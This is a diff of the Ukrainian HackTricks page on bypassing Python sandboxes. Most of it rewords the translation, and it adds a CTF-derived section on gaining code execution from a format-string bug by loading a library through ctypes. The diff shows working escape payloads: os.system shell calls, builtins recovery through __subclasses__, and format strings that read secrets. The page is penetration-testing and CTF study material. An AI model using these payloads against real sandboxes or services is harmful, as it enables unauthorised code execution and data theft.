@@ -1,8 +1,8 @@
 # Bypass Python sandboxes
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -19,7 +19,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## Бібліотеки виконання команд
 
-Перше, що вам потрібно знати, це чи можете ви безпосередньо виконувати код з якоїсь вже імпортованої бібліотеки, або чи можете ви імпортувати будь-яку з цих бібліотек:
+Перше, що вам потрібно знати, це чи можете ви безпосередньо виконувати код з якоюсь вже імпортованою бібліотекою, або чи можете ви імпортувати будь-яку з цих бібліотек:
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -62,7 +62,7 @@ Python намагається **завантажити бібліотеки з �
 
 ![](<../../../.gitbook/assets/image (559).png>)
 
-## Обхід пісочниці pickle за допомогою стандартних встановлених пакетів python
+## Обхід пісочниці pickle за допомогою стандартно встановлених python пакетів
 
 ### Стандартні пакети
 
@@ -249,7 +249,7 @@ __ixor__ (k ^= 'import os; os.system("sh")')
 ```
 #### Створення об'єктів з [метакласами](https://docs.python.org/3/reference/datamodel.html#metaclasses)
 
-Ключова річ, яку дозволяють робити метакласи, це **створити екземпляр класу, не викликаючи конструктор** безпосередньо, створюючи новий клас з цільовим класом як метаклас.
+Ключова річ, яку дозволяють нам метакласи, це **створити екземпляр класу, не викликаючи конструктор** безпосередньо, створюючи новий клас з цільовим класом як метаклас.
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
 # This will define the members of the "subclass"
@@ -374,7 +374,7 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**Нижче наведена більша функція**](./#recursive-search-of-builtins-globals) для знаходження десятків/**сотень** **місць**, де ви можете знайти **вбудовані**.
+[**Нижче наведена більша функція**](./#recursive-search-of-builtins-globals) для знаходження десятків/**сотень** **місць**, де ви можете знайти **вбудовані функції**.
 
 #### Python2 та Python3
 ```python
@@ -553,7 +553,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## Рекурсивний пошук в Builtins, Globals...
 
 {% hint style="warning" %}
-Це просто **чудово**. Якщо ви **шукаєте об'єкт, наприклад globals, builtins, open або будь-що інше**, просто використовуйте цей скрипт, щоб **рекурсивно знайти місця, де ви можете знайти цей об'єкт.**
+Це просто **чудово**. Якщо ви **шукаєте об'єкт, такий як globals, builtins, open або будь-що інше**, просто використовуйте цей скрипт, щоб **рекурсивно знайти місця, де ви можете знайти цей об'єкт.**
 {% endhint %}
 ```python
 import os, sys # Import these to find more gadgets
@@ -670,7 +670,7 @@ print(SEARCH_FOR)
 if __name__ == "__main__":
 main()
 ```
-Ви можете перевірити вихід цього скрипта на цій сторінці:
+Ви можете перевірити вихідні дані цього скрипта на цій сторінці:
 
 {% content-ref url="https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md" %}
 [https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md](https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md)
@@ -679,11 +679,6 @@ main()
 ## Python Форматний рядок
 
 Якщо ви **надсилаєте** **рядок** до python, який буде **форматуватися**, ви можете використовувати `{}` для доступу до **внутрішньої інформації python.** Ви можете використовувати попередні приклади для доступу до глобальних або вбудованих функцій, наприклад.
-
-{% hint style="info" %}
-Однак є **обмеження**, ви можете використовувати лише символи `.[]`, тому ви **не зможете виконати довільний код**, лише читати інформацію.\
-_**Якщо ви знаєте, як виконати код через цю вразливість, будь ласка, зв'яжіться зі мною.**_
-{% endhint %}
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -723,10 +718,10 @@ return 'HAL 9000'
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-**Більше прикладів** про **формат** **рядків** можна знайти на [**https://pyformat.info/**](https://pyformat.info)
+**Більше прикладів** про **формат** **рядків** можна знайти за посиланням [**https://pyformat.info/**](https://pyformat.info)
 
 {% hint style="danger" %}
-Перевірте також наступну сторінку на наявність гаджетів, які зможуть r**ead sensitive information from Python internal objects**:
+Перевірте також наступну сторінку на наявність гаджетів, які зможуть r**ead чутливу інформацію з внутрішніх об'єктів Python**:
 {% endhint %}
 
 {% content-ref url="../python-internal-read-gadgets.md" %}
@@ -743,14 +738,58 @@ return 'HAL 9000'
 
 # Access an element through several links
 {whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
+
+# Example from https://corgi.rip/posts/buckeye-writeups/
+secret_variable = "clueless"
+x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
+str(x) # Out: clueless
 ```
+### Від формату до RCE завантаження бібліотек
+
+Згідно з [**TypeMonkey chall з цього опису**](https://corgi.rip/posts/buckeye-writeups/), можливо завантажувати довільні бібліотеки з диска, зловживаючи вразливістю форматного рядка в python.
+
+Нагадаємо, що кожного разу, коли виконується дія в python, виконується якась функція. Наприклад, `2*3` виконає **`(2).mul(3)`** або **`{'a':'b'}['a']`** буде **`{'a':'b'}.__getitem__('a')`**.
+
+Ви можете знайти більше подібного в розділі [**Виконання Python без викликів**](./#python-execution-without-calls).
+
+Вразливість форматного рядка python не дозволяє виконувати функцію (вона не дозволяє використовувати дужки), тому неможливо отримати RCE, як `'{0.system("/bin/sh")}'.format(os)`.\
+Однак, можливо використовувати `[]`. Тому, якщо звичайна бібліотека python має метод **`__getitem__`** або **`__getattr__**, який виконує довільний код, їх можна зловживати для отримання RCE.
+
+Шукаючи такий гаджет в python, опис пропонує цей [**запит пошуку на Github**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code). Де він знайшов цей [один](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463):
+```python
+class LibraryLoader(object):
+def __init__(self, dlltype):
+self._dlltype = dlltype
+
+def __getattr__(self, name):
+if name[0] == '_':
+raise AttributeError(name)
+try:
+dll = self._dlltype(name)
+except OSError:
+raise AttributeError(name)
+setattr(self, name, dll)
+return dll
+
+def __getitem__(self, name):
+return getattr(self, name)
+
+cdll = LibraryLoader(CDLL)
+pydll = LibraryLoader(PyDLL)
+```
+Цей гаджет дозволяє **завантажити бібліотеку з диска**. Тому потрібно якимось чином **написати або завантажити бібліотеку для правильного завантаження** на атакований сервер.
+```python
+'{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
+```
+Виклик насправді використовує іншу вразливість на сервері, яка дозволяє створювати довільні файли на диску сервера.
+
 ## Розбір об'єктів Python
 
 {% hint style="info" %}
-Якщо ви хочете **вивчити** **байт-код Python** детально, прочитайте цей **чудовий** пост на цю тему: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+Якщо ви хочете **вивчити** **байт-код python** детально, прочитайте цей **чудовий** пост на цю тему: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
-В деяких CTF вам можуть надати назву **кастомної функції, в якій знаходиться прапор**, і вам потрібно переглянути **внутрішню структуру** **функції**, щоб витягти його.
+В деяких CTF вам можуть надати назву **кастомної функції, де знаходиться прапор**, і вам потрібно буде переглянути **внутрішню структуру** **функції**, щоб витягти його.
 
 Це функція для перевірки:
 ```python
@@ -898,7 +937,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ## Compiling Python
 
 Тепер уявімо, що якимось чином ви можете **вивантажити інформацію про функцію, яку ви не можете виконати**, але вам **потрібно** її **виконати**.\
-Як у наступному прикладі, ви **можете отримати доступ до об'єкта коду** цієї функції, але просто читаючи disassemble, ви **не знаєте, як обчислити прапор** (_уявіть більш складну функцію `calc_flag`_)
+Як у наступному прикладі, ви **можете отримати доступ до об'єкта коду** цієї функції, але просто читаючи disassemble, ви **не знаєте, як обчислити прапорець** (_уявіть більш складну функцію `calc_flag`_)
 ```python
 def get_flag(some_input):
 var1=1
@@ -988,7 +1027,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-Якщо ви не можете отримати доступ до `eval` або `exec`, ви можете створити **правильну функцію**, але прямий виклик зазвичай завершиться невдачею з повідомленням: _конструктор недоступний у обмеженому режимі_. Тому вам потрібна **функція, яка не знаходиться в обмеженому середовищі, щоб викликати цю функцію.**
+Якщо ви не можете отримати доступ до `eval` або `exec`, ви можете створити **правильну функцію**, але прямий виклик зазвичай завершиться невдачею з повідомленням: _конструктор недоступний в обмеженому режимі_. Тому вам потрібна **функція, яка не знаходиться в обмеженому середовищі, щоб викликати цю функцію.**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1011,7 +1050,7 @@ f(42)
 ### Assert
 
 Python, виконуваний з оптимізаціями з параметром `-O`, видалить оператори assert та будь-який код, що залежить від значення **debug**.\
-Отже, перевірки, такі як
+Тому перевірки, такі як
 ```python
 def check_permission(super_user):
 try:
@@ -1031,10 +1070,9 @@ print(f"\nNot a Super User!!!\n")
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-
 {% hint style="success" %}
-Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Вивчайте та практикуйте AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Вивчайте та практикуйте GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
